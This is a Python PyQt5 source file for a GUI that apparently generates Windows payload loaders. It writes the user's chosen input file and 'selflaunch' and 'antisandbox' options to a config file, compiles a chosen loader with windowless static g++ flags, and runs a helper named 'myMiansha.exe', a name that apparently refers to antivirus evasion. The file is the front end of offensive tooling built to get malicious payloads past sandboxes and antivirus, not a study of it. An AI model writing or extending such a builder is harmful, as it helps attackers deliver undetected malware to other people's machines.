from gui import Ui_MainWindow

#导入程序运行必须模块
import sys
import os
#PyQt5中使用的基本控件都在PyQt5.QtWidgets模块中
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog, QMessageBox
from PyQt5.QtCore import Qt


class MyMainForm(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainForm, self).__init__(parent)
        self.setupUi(self)
        self.pushButton_select.clicked.connect(self.open_file)
        self.pushButton_generator.clicked.connect(self.generator)

    def open_file(self):
        fileName, fileType = QFileDialog.getOpenFileName(
            self, "选取文件", os.path.dirname(__file__),
            "All Files(*);;Text Files(*.txt)")
        self.lineEdit_file_select.setText(fileName)

    def generator(self):
        print("i am generator")
        os.chdir(os.path.dirname(__file__))
        f = open("config", "w")
        f.write(self.lineEdit_file_select.text() + "\n")
        if self.checkBox_selflaunch.checkState() == Qt.Checked:
            f.write("selflaunch:1\n")
        else:
            f.write("selflaunch:0\n")
        if self.checkBox_antisandbox.checkState() == Qt.Checked:
            f.write("antisandbox:1\n")
        else:
            f.write("antisandbox:0\n")
        f.write(self.comboBox_LoadMethed.currentText())
        f.close()
        is32 = ""
        if self.checkBox_is32.checkState() == Qt.Checked:
            is32 = "-m32"
        os.system(r"g++ load/{}.cpp {} -mwindows --static -o bin/{}".format(
            self.comboBox_LoadMethed.currentText(), is32,
            self.comboBox_LoadMethed.currentText()))
        os.system(r".\load\myMiansha.exe")
        if (os.path.exists(r"bin/{}.exe".format(
                self.comboBox_LoadMethed.currentText()))):
            QMessageBox.about(self, "succeed", "已生成在bin目录中")
        else:
            QMessageBox.about(self, "Failed", "生成错误")


if __name__ == "__main__":
    #固定的，PyQt5程序都需要QApplication对象。sys.argv是命令行参数列表，确保程序可以双击运行
    app = QApplication(sys.argv)
    #初始化
    myWin = MyMainForm()
    #将窗口控件显示在屏幕上
    myWin.show()
    #程序运行，sys.exit方法确保程序完整退出。
    sys.exit(app.exec_())